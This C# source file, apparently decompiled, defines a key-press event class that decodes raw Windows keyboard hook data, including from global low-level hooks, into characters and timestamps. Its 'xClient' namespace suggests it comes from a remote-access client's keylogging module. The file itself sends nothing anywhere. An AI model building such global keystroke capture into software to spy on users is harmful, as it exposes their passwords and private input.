using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook;

public class KeyPressEventArgsExt : KeyPressEventArgs
{
	public bool IsNonChar { get; private set; }

	public int Timestamp { get; private set; }

	internal KeyPressEventArgsExt(char keyChar, int timestamp)
		: base(keyChar)
	{
		IsNonChar = keyChar == '\0';
		Timestamp = timestamp;
	}

	public KeyPressEventArgsExt(char keyChar)
		: this(keyChar, Environment.TickCount)
	{
	}

	internal static IEnumerable<KeyPressEventArgsExt> FromRawDataApp(CallbackData data)
	{
		IntPtr wParam = data.WParam;
		uint num = (uint)data.LParam.ToInt64();
		bool flag = (num & 0x40000000) != 0;
		bool flag2 = (num & 0x80000000u) != 0;
		if (!flag && !flag2)
		{
			yield break;
		}
		int virtualKeyCode = (int)wParam;
		int scanCode = checked((int)(num & 0xFF0000u));
		KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, 0, out var chars);
		if (chars != null)
		{
			char[] array = chars;
			foreach (char keyChar in array)
			{
				yield return new KeyPressEventArgsExt(keyChar);
			}
		}
	}

	internal static IEnumerable<KeyPressEventArgsExt> FromRawDataGlobal(CallbackData data)
	{
		IntPtr wParam = data.WParam;
		IntPtr lParam = data.LParam;
		if ((int)wParam != 256)
		{
			yield break;
		}
		KeyboardHookStruct keyboardHookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardHookStruct));
		int virtualKeyCode = keyboardHookStruct.VirtualKeyCode;
		int scanCode = keyboardHookStruct.ScanCode;
		int fuState = keyboardHookStruct.Flags;
		if (virtualKeyCode == 231)
		{
			char keyChar = (char)scanCode;
			yield return new KeyPressEventArgsExt(keyChar, keyboardHookStruct.Time);
			yield break;
		}
		KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, out var chars);
		if (chars != null)
		{
			char[] array = chars;
			foreach (char keyChar2 in array)
			{
				yield return new KeyPressEventArgsExt(keyChar2, keyboardHookStruct.Time);
			}
		}
	}
}
